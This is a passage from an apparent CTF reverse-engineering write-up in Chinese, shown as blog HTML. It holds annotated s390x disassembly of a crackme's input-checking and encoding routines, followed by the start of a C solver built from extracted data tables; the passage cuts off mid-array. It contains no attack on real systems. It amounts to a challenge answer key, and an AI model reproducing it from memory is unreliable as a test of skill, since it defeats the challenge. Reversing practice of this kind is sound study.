class="number">00</span> <span class="number">06</span>       je<span class="number">0x1000946</span></span><br><span class="line"><span class="number">100093</span>e:a7 <span class="number">18</span> <span class="number">00</span> <span class="number">00</span>       lhi%r1,<span class="number">0</span></span><br><span class="line"><span class="number">1000942</span>:a7 f4 <span class="number">00</span> <span class="number">56</span>       j<span class="number">0x10009ee</span></span><br><span class="line"><span class="number">1000946</span>:e5 <span class="number">4</span>c b0 ac <span class="number">00</span> <span class="number">00</span> mvhi<span class="number">172</span>(%r11),<span class="number">0</span></span><br><span class="line"><span class="number">100094</span>c:a7 f4 <span class="number">00</span> <span class="number">49</span>       j<span class="number">0x10009de</span></span><br><span class="line"><span class="number">1000950</span>:e3 <span class="number">10</span> b0 ac <span class="number">00</span> <span class="number">14</span> lgf%r1,<span class="number">172</span>(%r11)</span><br><span class="line"><span class="number">1000956</span>:e3 <span class="number">10</span> b0 a0 <span class="number">00</span> <span class="number">08</span> ag%r1,<span class="number">160</span>(%r11)</span><br><span class="line"><span class="number">100095</span>c:<span class="number">43</span> <span class="number">10</span> <span class="number">10</span> <span class="number">00</span>       ic%r1,<span class="number">0</span>(%r1)</span><br><span class="line"><span class="number">1000960</span>:b9 <span class="number">94</span> <span class="number">00</span> <span class="number">11</span>       llcr%r1,%r1</span><br><span class="line"><span class="number">1000964</span>:c2 <span class="number">1f</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">2f</span> clfi%r1,<span class="number">47</span></span><br><span class="line"><span class="number">100096</span>a:a7 c4 <span class="number">00</span> <span class="number">11</span>       jle<span class="number">0x100098c</span></span><br><span class="line"><span class="number">100096</span>e:e3 <span class="number">10</span> b0 ac <span class="number">00</span> <span class="number">14</span> lgf%r1,<span class="number">172</span>(%r11)</span><br><span class="line"><span class="number">1000974</span>:e3 <span class="number">10</span> b0 a0 <span class="number">00</span> <span class="number">08</span> ag%r1,<span class="number">160</span>(%r11)</span><br><span class="line"><span class="number">100097</span>a:<span class="number">43</span> <span class="number">10</span> <span class="number">10</span> <span class="number">00</span>       ic%r1,<span class="number">0</span>(%r1)</span><br><span class="line"><span class="number">100097</span>e:b9 <span class="number">94</span> <span class="number">00</span> <span class="number">11</span>       llcr%r1,%r1</span><br><span class="line"><span class="number">1000982</span>:c2 <span class="number">1f</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">39</span> clfi%r1,<span class="number">57</span></span><br><span class="line"><span class="number">1000988</span>:a7 c4 <span class="number">00</span> <span class="number">24</span>       jle<span class="number">0x10009d0</span></span><br><span class="line"><span class="number">100098</span>c:e3 <span class="number">10</span> b0 ac <span class="number">00</span> <span class="number">14</span> lgf%r1,<span class="number">172</span>(%r11)</span><br><span class="line"><span class="number">1000992</span>:e3 <span class="number">10</span> b0 a0 <span class="number">00</span> <span class="number">08</span> ag%r1,<span class="number">160</span>(%r11)</span><br><span class="line"><span class="number">1000998</span>:<span class="number">43</span> <span class="number">10</span> <span class="number">10</span> <span class="number">00</span>       ic%r1,<span class="number">0</span>(%r1)</span><br><span class="line"><span class="number">100099</span>c:b9 <span class="number">94</span> <span class="number">00</span> <span class="number">11</span>       llcr%r1,%r1</span><br><span class="line"><span class="number">10009</span>a0:c2 <span class="number">1f</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">60</span> clfi%r1,<span class="number">96</span></span><br><span class="line"><span class="number">10009</span>a6:a7 c4 <span class="number">00</span> <span class="number">11</span>       jle<span class="number">0x10009c8</span></span><br><span class="line"><span class="number">10009</span>aa:e3 <span class="number">10</span> b0 ac <span class="number">00</span> <span class="number">14</span> lgf%r1,<span class="number">172</span>(%r11)</span><br><span class="line"><span class="number">10009b</span>0:e3 <span class="number">10</span> b0 a0 <span class="number">00</span> <span class="number">08</span> ag%r1,<span class="number">160</span>(%r11)</span><br><span class="line"><span class="number">10009b</span>6:<span class="number">43</span> <span class="number">10</span> <span class="number">10</span> <span class="number">00</span>       ic%r1,<span class="number">0</span>(%r1)</span><br><span class="line"><span class="number">10009b</span>a:b9 <span class="number">94</span> <span class="number">00</span> <span class="number">11</span>       llcr%r1,%r1</span><br><span class="line"><span class="number">10009b</span>e:c2 <span class="number">1f</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">66</span> clfi%r1,<span class="number">102</span></span><br><span class="line"><span class="number">10009</span>c4:a7 c4 <span class="number">00</span> <span class="number">09</span>       jle<span class="number">0x10009d6</span></span><br><span class="line"><span class="number">10009</span>c8:a7 <span class="number">18</span> <span class="number">00</span> <span class="number">00</span>       lhi%r1,<span class="number">0</span></span><br><span class="line"><span class="number">10009</span>cc:a7 f4 <span class="number">00</span> <span class="number">11</span>       j<span class="number">0x10009ee</span></span><br><span class="line"><span class="number">10009</span>d0:<span class="number">18</span> <span class="number">00</span>             lr%r0,%r0</span><br><span class="line"><span class="number">10009</span>d2:a7 f4 <span class="number">00</span> <span class="number">03</span>       j<span class="number">0x10009d8</span></span><br><span class="line"><span class="number">10009</span>d6:<span class="number">18</span> <span class="number">00</span>             lr%r0,%r0</span><br><span class="line"><span class="number">10009</span>d8:eb <span class="number">01</span> b0 ac <span class="number">00</span> <span class="number">6</span>a asi<span class="number">172</span>(%r11),<span class="number">1</span></span><br><span class="line"><span class="number">10009</span>de:<span class="number">58</span> <span class="number">10</span> b0 ac       l%r1,<span class="number">172</span>(%r11)</span><br><span class="line"><span class="number">10009e2</span>:a7 <span class="number">1</span>e <span class="number">00</span> <span class="number">1f</span>       chi%r1,<span class="number">31</span></span><br><span class="line"><span class="number">10009e6</span>:a7 c4 ff b5       jle<span class="number">0x1000950</span></span><br><span class="line"><span class="number">10009</span>ea:a7 <span class="number">18</span> <span class="number">00</span> <span class="number">01</span>       lhi%r1,<span class="number">1</span></span><br><span class="line"><span class="number">10009</span>ee:b9 <span class="number">14</span> <span class="number">00</span> <span class="number">11</span>       lgfr%r1,%r1</span><br><span class="line"><span class="number">10009f</span>2:b9 <span class="number">04</span> <span class="number">00</span> <span class="number">21</span>       lgr%r2,%r1</span><br><span class="line"><span class="number">10009f</span>6:e3 <span class="number">40</span> b1 <span class="number">20</span> <span class="number">00</span> <span class="number">04</span> lg%r4,<span class="number">288</span>(%r11)</span><br><span class="line"><span class="number">10009f</span>c:eb bf b1 <span class="number">08</span> <span class="number">00</span> <span class="number">04</span> lmg%r11,%r15,<span class="number">264</span>(%r11)</span><br><span class="line"><span class="number">1000</span>a02:<span class="number">07</span> f4             br%r4</span><br><span class="line"><span class="number">1000</span>a04:<span class="number">07</span> <span class="number">07</span>             nopr%r7</span><br><span class="line"><span class="number">1000</span>a06:<span class="number">07</span> <span class="number">07</span>             nopr%r7</span><br><span class="line"><span class="number">1000</span>a08:b3 c1 <span class="number">00</span> <span class="number">2b</span>       ldgr%f2,%r11  <span class="comment">//åŠ å¯†åˆ¤æ–­å‡½æ•°</span></span><br><span class="line"><span class="number">1000</span>a0c:b3 c1 <span class="number">00</span> <span class="number">0f</span>       ldgr%f0,%r15</span><br><span class="line"><span class="number">1000</span>a10:e3 f0 ff <span class="number">48</span> ff <span class="number">71</span> lay%r15,<span class="number">-184</span>(%r15)</span><br><span class="line"><span class="number">1000</span>a16:b9 <span class="number">04</span> <span class="number">00</span> bf       lgr%r11,%r15</span><br><span class="line"><span class="number">1000</span>a1a:e3 <span class="number">20</span> b0 a0 <span class="number">00</span> <span class="number">24</span> stg%r2,<span class="number">160</span>(%r11)        <span class="comment">//input</span></span><br><span class="line"><span class="number">1000</span>a20:e5 <span class="number">4</span>c b0 a8 <span class="number">00</span> <span class="number">00</span> mvhi<span class="number">168</span>(%r11),<span class="number">0</span> <span class="comment">//mov ç«‹å³æ•°</span></span><br><span class="line"><span class="number">1000</span>a26:a7 f4 <span class="number">00</span> <span class="number">4b</span>       j<span class="number">0x1000abc</span></span><br><span class="line"></span><br><span class="line"><span class="number">1000</span>a2a:e3 <span class="number">10</span> b0 a8 <span class="number">00</span> <span class="number">14</span> lgf%r1,<span class="number">168</span>(%r11)  <span class="comment">//å¾ªç¯</span></span><br><span class="line"><span class="number">1000</span>a30:e3 <span class="number">10</span> b0 a0 <span class="number">00</span> <span class="number">08</span> ag%r1,<span class="number">160</span>(%r11)<span class="comment">//r1 = input[i]</span></span><br><span class="line"><span class="number">1000</span>a36:<span class="number">43</span> <span class="number">10</span> <span class="number">10</span> <span class="number">00</span>       ic%r1,<span class="number">0</span>(%r1)</span><br><span class="line"><span class="number">1000</span>a3a:b9 <span class="number">94</span> <span class="number">00</span> <span class="number">11</span>       llcr%r1,%r1</span><br><span class="line"><span class="number">1000</span>a3e:<span class="number">50</span> <span class="number">10</span> b0 b4       st%r1,<span class="number">180</span>(%r11)<span class="comment">//r11[180] = r1</span></span><br><span class="line"><span class="number">1000</span>a42:<span class="number">58</span> <span class="number">30</span> b0 b4       l%r3,<span class="number">180</span>(%r11) <span class="comment">//r3 = r1</span></span><br><span class="line"><span class="number">1000</span>a46:<span class="number">71</span> <span class="number">30</span> b0 b4       ms%r3,<span class="number">180</span>(%r11)<span class="comment">//r3*r3</span></span><br><span class="line"><span class="number">1000</span>a4a:c0 <span class="number">10</span> <span class="number">00</span> <span class="number">04</span> d3 ef larl%r1,<span class="number">0x109b228</span><span class="comment">//</span></span><br><span class="line"><span class="number">1000</span>a50:e3 <span class="number">20</span> b0 a8 <span class="number">00</span> <span class="number">14</span> lgf%r2,<span class="number">168</span>(%r11)   <span class="comment">//i</span></span><br><span class="line"><span class="number">1000</span>a56:eb <span class="number">22</span> <span class="number">00</span> <span class="number">02</span> <span class="number">00</span> <span class="number">0</span>d sllg%r2,%r2,<span class="number">2</span><span class="comment">// &lt;&lt; 2  (*4)</span></span><br><span class="line"><span class="number">1000</span>a5c:<span class="number">58</span> <span class="number">12</span> <span class="number">10</span> <span class="number">00</span>       l%r1,<span class="number">0</span>(%r2,%r1)<span class="comment">// 0x109b228[i&lt;&lt;2]</span></span><br><span class="line"><span class="number">1000</span>a60:b2 <span class="number">52</span> <span class="number">00</span> <span class="number">31</span>       msr%r3,%r1<span class="comment">//input[i]*input[i]*0x109b228[i&lt;&lt;2]</span></span><br><span class="line"></span><br><span class="line"><span class="number">1000</span>a64:c0 <span class="number">10</span> <span class="number">00</span> <span class="number">04</span> d3 e2 larl%r1,<span class="number">0x109b228</span></span><br><span class="line"><span class="number">1000</span>a6a:e3 <span class="number">20</span> b0 a8 <span class="number">00</span> <span class="number">14</span> lgf%r2,<span class="number">168</span>(%r11)<span class="comment">//i</span></span><br><span class="line"><span class="number">1000</span>a70:a7 <span class="number">2b</span> <span class="number">00</span> <span class="number">20</span>       aghi%r2,<span class="number">32</span><span class="comment">//add + 32</span></span><br><span class="line"><span class="number">1000</span>a74:eb <span class="number">22</span> <span class="number">00</span> <span class="number">02</span> <span class="number">00</span> <span class="number">0</span>d sllg%r2,%r2,<span class="number">2</span><span class="comment">// &lt;&lt; 2</span></span><br><span class="line"><span class="number">1000</span>a7a:<span class="number">58</span> <span class="number">12</span> <span class="number">10</span> <span class="number">00</span>       l%r1,<span class="number">0</span>(%r2,%r1)<span class="comment">//0x109b228[(i+32)&lt;&lt;2]</span></span><br><span class="line"></span><br><span class="line"><span class="number">1000</span>a7e:<span class="number">71</span> <span class="number">10</span> b0 b4       ms%r1,<span class="number">180</span>(%r11)<span class="comment">//0x109b228[(i+32)&lt;&lt;2]*input[i]</span></span><br><span class="line"><span class="number">1000</span>a82:<span class="number">1</span>a <span class="number">31</span>             ar%r3,%r1<span class="comment">//input[i]*input[i]*0x109b228[i&lt;&lt;2] + 0x109b228[(i+32)&lt;&lt;2]*input[i]</span></span><br><span class="line"></span><br><span class="line"><span class="number">1000</span>a84:c0 <span class="number">10</span> <span class="number">00</span> <span class="number">04</span> d3 d2 larl%r1,<span class="number">0x109b228</span></span><br><span class="line"><span class="number">1000</span>a8a:e3 <span class="number">20</span> b0 a8 <span class="number">00</span> <span class="number">14</span> lgf%r2,<span class="number">168</span>(%r11)<span class="comment">//i</span></span><br><span class="line"><span class="number">1000</span>a90:a7 <span class="number">2b</span> <span class="number">00</span> <span class="number">40</span>       aghi%r2,<span class="number">64</span><span class="comment">//i+64</span></span><br><span class="line"><span class="number">1000</span>a94:eb <span class="number">22</span> <span class="number">00</span> <span class="number">02</span> <span class="number">00</span> <span class="number">0</span>d sllg%r2,%r2,<span class="number">2</span><span class="comment">//(i+64) &lt;&lt; 2</span></span><br><span class="line"><span class="number">1000</span>a9a:<span class="number">58</span> <span class="number">12</span> <span class="number">10</span> <span class="number">00</span>       l%r1,<span class="number">0</span>(%r2,%r1)<span class="comment">//r1 = 0x109b228[(i+64) &lt;&lt; 2]</span></span><br><span class="line"><span class="number">1000</span>a9e:<span class="number">1</span>a <span class="number">31</span>             ar%r3,%r1<span class="comment">//add r3 +  0x109b228[(i+64) &lt;&lt; 2]</span></span><br><span class="line"></span><br><span class="line"><span class="number">1000</span>aa0:c4 <span class="number">18</span> <span class="number">00</span> <span class="number">04</span> d3 <span class="number">68</span> lgrl%r1,<span class="number">0x109b170</span></span><br><span class="line"><span class="number">1000</span>aa6:e3 <span class="number">20</span> b0 a8 <span class="number">00</span> <span class="number">14</span> lgf%r2,<span class="number">168</span>(%r11)  <span class="comment">//i</span></span><br><span class="line"><span class="number">1000</span>aac:eb <span class="number">22</span> <span class="number">00</span> <span class="number">02</span> <span class="number">00</span> <span class="number">0</span>d sllg%r2,%r2,<span class="number">2</span><span class="comment">// i &lt;&lt; 2</span></span><br><span class="line"><span class="number">1000</span>ab2:<span class="number">50</span> <span class="number">32</span> <span class="number">10</span> <span class="number">00</span>       st%r3,<span class="number">0</span>(%r2,%r1)r1[r2] = r3, <span class="number">0x109dd08</span></span><br><span class="line"><span class="number">1000</span>ab6:eb <span class="number">01</span> b0 a8 <span class="number">00</span> <span class="number">6</span>a asi<span class="number">168</span>(%r11),<span class="number">1</span> <span class="comment">//i++;</span></span><br><span class="line"></span><br><span class="line"><span class="number">1000</span>abc:<span class="number">58</span> <span class="number">10</span> b0 a8       l%r1,<span class="number">168</span>(%r11)<span class="comment">//mov eax, i(168(%r11));</span></span><br><span class="line"><span class="number">1000</span>ac0:a7 <span class="number">1</span>e <span class="number">00</span> <span class="number">1f</span>       chi%r1,<span class="number">31</span></span><br><span class="line"><span class="number">1000</span>ac4:a7 c4 ff b3       jle<span class="number">0x1000a2a</span>   <span class="comment">//cmp </span></span><br><span class="line"></span><br><span class="line"><span class="number">1000</span>ac8:e5 <span class="number">4</span>c b0 ac <span class="number">00</span> <span class="number">01</span> mvhi<span class="number">172</span>(%r11),<span class="number">1</span> <span class="comment">//j = 1</span></span><br><span class="line"><span class="number">1000</span>ace:e5 <span class="number">4</span>c b0 b0 <span class="number">00</span> <span class="number">00</span> mvhi<span class="number">176</span>(%r11),<span class="number">0</span><span class="comment">//i = 0</span></span><br><span class="line"><span class="number">1000</span>ad4:a7 f4 <span class="number">00</span> <span class="number">21</span>       j<span class="number">0x1000b16</span></span><br><span class="line"></span><br><span class="line"><span class="number">1000</span>ad8:c4 <span class="number">18</span> <span class="number">00</span> <span class="number">04</span> d3 <span class="number">4</span>c lgrl%r1,<span class="number">0x109b170</span>  <span class="comment">//åˆ¤æ–­å¾ªç¯  åŠ å¯†åçš„æ•°æ®</span></span><br><span class="line"><span class="number">1000</span>ade:e3 <span class="number">20</span> b0 b0 <span class="number">00</span> <span class="number">14</span> lgf%r2,<span class="number">176</span>(%r11)<span class="comment">//i</span></span><br><span class="line"><span class="number">1000</span>ae4:eb <span class="number">22</span> <span class="number">00</span> <span class="number">02</span> <span class="number">00</span> <span class="number">0</span>d sllg%r2,%r2,<span class="number">2</span><span class="comment">//i &lt;&lt; 2</span></span><br><span class="line"><span class="number">1000</span>aea:<span class="number">58</span> <span class="number">32</span> <span class="number">10</span> <span class="number">00</span>       l%r3,<span class="number">0</span>(%r2,%r1)<span class="comment">//enc[i&lt;&lt;2]</span></span><br><span class="line"><span class="number">1000</span>aee:c0 <span class="number">10</span> <span class="number">00</span> <span class="number">04</span> d3 <span class="number">5</span>d larl%r1,<span class="number">0x109b1a8</span></span><br><span class="line"><span class="number">1000</span>af4:e3 <span class="number">20</span> b0 b0 <span class="number">00</span> <span class="number">14</span> lgf%r2,<span class="number">176</span>(%r11)<span class="comment">//i</span></span><br><span class="line"><span class="number">1000</span>afa:eb <span class="number">22</span> <span class="number">00</span> <span class="number">02</span> <span class="number">00</span> <span class="number">0</span>d sllg%r2,%r2,<span class="number">2</span><span class="comment">// i &lt;&lt; 2</span></span><br><span class="line"><span class="number">1000b</span>00:<span class="number">58</span> <span class="number">12</span> <span class="number">10</span> <span class="number">00</span>       l%r1,<span class="number">0</span>(%r2,%r1)<span class="comment">//d[i&lt;&lt;2]</span></span><br><span class="line"><span class="number">1000b</span>04:<span class="number">19</span> <span class="number">31</span>             cr%r3,%r1</span><br><span class="line"><span class="number">1000b</span>06:a7 <span class="number">84</span> <span class="number">00</span> <span class="number">05</span>       je<span class="number">0x1000b10</span></span><br><span class="line"><span class="number">1000b</span>0a:e5 <span class="number">4</span>c b0 ac <span class="number">00</span> <span class="number">00</span> mvhi<span class="number">172</span>(%r11),<span class="number">0</span></span><br><span class="line"><span class="number">1000b</span>10:eb <span class="number">01</span> b0 b0 <span class="number">00</span> <span class="number">6</span>a asi<span class="number">176</span>(%r11),<span class="number">1</span> <span class="comment">//add</span></span><br><span class="line"></span><br><span class="line"><span class="number">1000b</span>16:<span class="number">58</span> <span class="number">10</span> b0 b0       l%r1,<span class="number">176</span>(%r11)<span class="comment">//i</span></span><br><span class="line"><span class="number">1000b</span>1a:a7 <span class="number">1</span>e <span class="number">00</span> <span class="number">1f</span>       chi%r1,<span class="number">31</span><span class="comment">//cmp</span></span><br><span class="line"><span class="number">1000b</span>1e:a7 c4 ff dd       jle<span class="number">0x1000ad8</span></span><br><span class="line"></span><br><span class="line"><span class="number">1000b</span>22:<span class="number">58</span> <span class="number">10</span> b0 ac       l%r1,<span class="number">172</span>(%r11)</span><br><span class="line"><span class="number">1000b</span>26:b9 <span class="number">14</span> <span class="number">00</span> <span class="number">11</span>       lgfr%r1,%r1</span><br><span class="line"><span class="number">1000b</span>2a:b9 <span class="number">04</span> <span class="number">00</span> <span class="number">21</span>       lgr%r2,%r1</span><br><span class="line"><span class="number">1000b</span>2e:b3 cd <span class="number">00</span> b2       lgdr%r11,%f2</span><br><span class="line"><span class="number">1000b</span>32:b3 cd <span class="number">00</span> f0       lgdr%r15,%f0</span><br><span class="line"><span class="number">1000b</span>36:<span class="number">07</span> fe             br%r14</span><br><span class="line"></span><br><span class="line"><span class="number">1000b</span>38:eb bf f0 <span class="number">58</span> <span class="number">00</span> <span class="number">24</span> stmg%r11,%r15,<span class="number">88</span>(%r15)   <span class="comment">//mainå‡½æ•°</span></span><br><span class="line"><span class="number">1000b</span>3e:e3 f0 ff <span class="number">20</span> ff <span class="number">71</span> lay%r15,<span class="number">-224</span>(%r15)</span><br><span class="line"><span class="number">1000b</span>44:b9 <span class="number">04</span> <span class="number">00</span> bf       lgr%r11,%r15</span><br><span class="line"><span class="number">1000b</span>48:b2 <span class="number">4f</span> <span class="number">00</span> <span class="number">10</span>       ear%r1,%a0</span><br><span class="line"><span class="number">1000b</span>4c:eb <span class="number">11</span> <span class="number">00</span> <span class="number">20</span> <span class="number">00</span> <span class="number">0</span>d sllg%r1,%r1,<span class="number">32</span></span><br><span class="line"><span class="number">1000b</span>52:b2 <span class="number">4f</span> <span class="number">00</span> <span class="number">11</span>       ear%r1,%a1</span><br><span class="line"><span class="number">1000b</span>56:d2 <span class="number">07</span> b0 d8 <span class="number">10</span> <span class="number">28</span> mvc<span class="number">216</span>(<span class="number">8</span>,%r11),<span class="number">40</span>(%r1)</span><br><span class="line"><span class="number">1000b</span>5c:c0 <span class="number">20</span> <span class="number">00</span> <span class="number">03</span> <span class="number">82</span> <span class="number">84</span> larl%r2,<span class="number">0x1071064</span> <span class="comment">//please input ...</span></span><br><span class="line"><span class="number">1000b</span>62:c0 e5 <span class="number">00</span> <span class="number">00</span> <span class="number">40</span> <span class="number">43</span> brasl%r14,<span class="number">0x1008be8</span><span class="comment">//printf</span></span><br><span class="line"><span class="number">1000b</span>68:ec <span class="number">1b</span> <span class="number">00</span> a6 <span class="number">00</span> d9 aghik%r1,%r11,<span class="number">166</span></span><br><span class="line"><span class="number">1000b</span>6e:b9 <span class="number">04</span> <span class="number">00</span> <span class="number">31</span>       lgr%r3,%r1</span><br><span class="line"><span class="number">1000b</span>72:c0 <span class="number">20</span> <span class="number">00</span> <span class="number">03</span> <span class="number">82</span> <span class="number">87</span> larl%r2,<span class="number">0x1071080</span>      <span class="comment">// %s</span></span><br><span class="line"><span class="number">1000b</span>78:c0 e5 <span class="number">00</span> <span class="number">00</span> <span class="number">3</span>a <span class="number">5</span>c brasl%r14,<span class="number">0x1008030</span> <span class="comment">// scanf(" ");</span></span><br><span class="line"><span class="number">1000b</span>7e:ec <span class="number">1b</span> <span class="number">00</span> a6 <span class="number">00</span> d9 aghik%r1,%r11,<span class="number">166</span> <span class="comment">//add  </span></span><br><span class="line"><span class="number">1000b</span>84:b9 <span class="number">04</span> <span class="number">00</span> <span class="number">21</span>       lgr%r2,%r1%r1 : input</span><br><span class="line"><span class="number">1000b</span>88:c0 e5 ff ff fe c4 brasl%r14,<span class="number">0x1000910</span><span class="comment">//å…³é”®åŠ å¯†å‡½æ•°ã€‚</span></span><br><span class="line"><span class="number">1000b</span>8e:b9 <span class="number">04</span> <span class="number">00</span> <span class="number">12</span>       lgr%r1,%r2<span class="comment">//mov</span></span><br><span class="line"><span class="number">1000b</span>92:<span class="number">12</span> <span class="number">11</span>             ltr%r1,%r1 <span class="comment">//cmp  test</span></span><br><span class="line"><span class="number">1000b</span>94:a7 <span class="number">84</span> <span class="number">00</span> <span class="number">17</span>       je<span class="number">0x1000bc2</span></span><br><span class="line"><span class="number">1000b</span>98:ec <span class="number">1b</span> <span class="number">00</span> a6 <span class="number">00</span> d9 aghik%r1,%r11,<span class="number">166</span></span><br><span class="line"><span class="number">1000b</span>9e:b9 <span class="number">04</span> <span class="number">00</span> <span class="number">21</span>       lgr%r2,%r1</span><br><span class="line"><span class="number">1000b</span>a2:c0 e5 ff ff ff <span class="number">33</span> brasl%r14,<span class="number">0x1000a08</span></span><br><span class="line"><span class="number">1000b</span>a8:b9 <span class="number">04</span> <span class="number">00</span> <span class="number">12</span>       lgr%r1,%r2</span><br><span class="line"><span class="number">1000b</span>ac:<span class="number">12</span> <span class="number">11</span>             ltr%r1,%r1</span><br><span class="line"><span class="number">1000b</span>ae:a7 <span class="number">84</span> <span class="number">00</span> <span class="number">0</span>a       je<span class="number">0x1000bc2</span></span><br><span class="line"><span class="number">1000b</span>b2:c0 <span class="number">20</span> <span class="number">00</span> <span class="number">03</span> <span class="number">82</span> <span class="number">69</span> larl%r2,<span class="number">0x1071084</span> <span class="comment">// lea "you win"</span></span><br><span class="line"><span class="number">1000b</span>b8:c0 e5 <span class="number">00</span> <span class="number">00</span> <span class="number">40</span> <span class="number">18</span> brasl%r14,<span class="number">0x1008be8</span></span><br><span class="line"><span class="number">1000b</span>be:a7 f4 <span class="number">00</span> <span class="number">08</span>       j<span class="number">0x1000bce</span></span><br><span class="line"><span class="number">1000b</span>c2:c0 <span class="number">20</span> <span class="number">00</span> <span class="number">03</span> <span class="number">82</span> <span class="number">66</span> larl%r2,<span class="number">0x107108e</span>   <span class="comment">//lea "you lose!"</span></span><br><span class="line"><span class="number">1000b</span>c8:c0 e5 <span class="number">00</span> <span class="number">00</span> <span class="number">40</span> <span class="number">10</span> brasl%r14,<span class="number">0x1008be8</span></span><br></pre></td></tr></table></figure><p>æå–å¤„æ•°æ®ï¼Œåœ¨gdbä¸­ä½¿ç”¨x/100xwæŸ¥çœ‹çš„æ•°æ®ç„¶åæå–å‡ºï¼ˆç›´æ¥æ‰¾åˆ°åœ°å€è®©hex.txtæ–‡ä»¶æ‰¾ä¹Ÿå¯ä»¥ï¼‰ã€‚</p><p>ç„¶åè§£å¯†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> data[] = &#123; <span class="number">0x0000b2b0</span>, <span class="number">0x00006e72</span>, <span class="number">0x00006061</span>, <span class="number">0x0000565d</span>,</span><br><span class="line"><span class="number">0x0000942d</span>, <span class="number">0x0000ac79</span>, <span class="number">0x0000391c</span>, <span class="number">0x0000643d</span>,</span><br><span class="line"><span class="number">0x0000ec3f</span>, <span class="number">0x0000bd10</span>, <span class="number">0x0000c43e</span>, <span class="number">0x00007a65</span>,</span><br><span class="line"><span class="number">0x0000184b</span>, <span class="number">0x0000ef5b</span>, <span class="number">0x00005a06</span>, <span class="number">0x0000a8c0</span>,</span><br><span class="line"><span class="number">0x0000f64b</span>, <span class="number">0x0000c774</span>, <span class="number">0x000002ff</span>, <span class="number">0x00008e57</span>,</span><br><span class="line"><span class="number">0x0000aed9</span>, <span class="number">0x0000d8a9</span>, <span class="number">0x0000230c</span>, <span class="number">0x000074e8</span>,</span><br><span class="line"><span class="number">0x0000c2a6</span>, <span class="number">0x000088b3</span>, <span class="number">0x0000af2a</span>, <span class="number">0x00009ea7</span>,</span><br><span class="line"><span class="number">0x0000ce8a</span>, <span class="number">0x00005924</span>, <span class="number">0x0000d276</span>, <span class="number">0x000056d4</span>,</span><br><span class="line"><span class="number">0x000077d7</span>, <span class="number">0x0000990e</span>, <span class="number">0x0000b585</span>, <span class="number">0x00004bcd</span>,</span><br><span class="line"><span class="number">0x00005277</span>, <span class="number">0x00001afc</span>, <span class="number">0x00008c8a</span>, <span class="number">0x0000cdb5</span>,</span><br><span class="line"><span class="number">0x00006e26</span>, <span class="number">0x00004c22</span>, <span class="number">0x0000673f</span>, <span class="number">0x0000daff</span>,</span><br><span class="line"><span class="number">0x00000fac</span>, <span class="number">0x000086c7</span>, <span class="number">0x0000e048</span>, <span class="number">0x0000c483</span>,</span><br><span class="line"><span class="number">0x000085d3</span>, <span class="number">0x00002204</span>, <span class="number">0x0000c2ee</span>, <span class="number">0x0000e07f</span>,</span><br><span class="line"><span class="number">0x00000caf</span>, <span class="number">0x0000bf76</span>, <span class="number">0x000063fe</span>, <span class="number">0x0000bffb</span>,</span><br><span class="line"><span class="number">0x00004b09</span>, <span class="number">0x0000e5b3</span>, <span class="number">0x00008bda</span>, <span class="number">0x000096df</span>,</span><br><span class="line"><span class="number">0x0000866d</span>, <span class="number">0x00001719</span>, <span class="number">0x00006bcf</span>, <span class="number">0x0000adcc</span>,</span><br><span class="line"><span class="number">0x00000f2b</span>, <span class="number">0x000051ce</span>, <span class="number">0x00001549</span>, <span class="number">0x000020c1</span>,</span><br><span class="line"><span class="number">0x00003a8d</span>, <span class="number">0x000005f5</span>, <span class="number">0x00005403</span>, <span class="number">0x00001125</span>,</span><br><span class="line"><span class="number">0x00009161</span>, <span class="number">0x0000e2a5</span>, <span class="number">0x00005196</span>, <span class="number">0x0000d8d2</span>,</span><br><span class="line"><span class="number">0x0000d644</span>, <span class="number">0x0000ee86</span>, <span class="number">0x00003896</span>, <span class="number">0x00002e71</span>,</span><br><span class="line"><span class="number">0x0000a6f1</span>, <span class="number">0x0000dfcf</span>, <span class="number">0x00003ece</span>, <span class="number">0x00007d49</span>,</span><br><span class="line"><span class="number">0x0000c24d</span>, <span class="number">0x0000237e</span>, <span class="number">0x00009352</span>, <span class="number">0x00007a97</span>,</span><br><span class="line"><span class="number">0x00007bfa</span>, <span class="number">0x0000cbaa</span>, <span class="number">0x000010dc</span>, <span class="number">0x00003bd9</span>,</span><br><span class="line"><span class="number">0x00007d7b</span>, <span class="number">0x00003b88</span>, <span class="number">0x0000b0d0</span>, <span class="number">0x0000e8bc</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> result[] = &#123; <span class="number">0x08a73233</span>, <span class="number">0x116db0f6</span>, <span class="number">0x0e654937</span>, <span class="number">0x03c374a7</span>,</span><br><span class="line"><span class="number">0x16bc8ed9</span>, <span class="number">0x0846b755</span>, <span class="number">0x08949f47</span>, <span class="number">0x04a13c27</span>,</span><br><span class="line"><span class="number">0x0976cf0a</span>, <span class="number">0x07461189</span>, <span class="number">0x1e1a5c12</span>, <span class="number">0x11e64d96</span>,</span><br><span class="line"><span 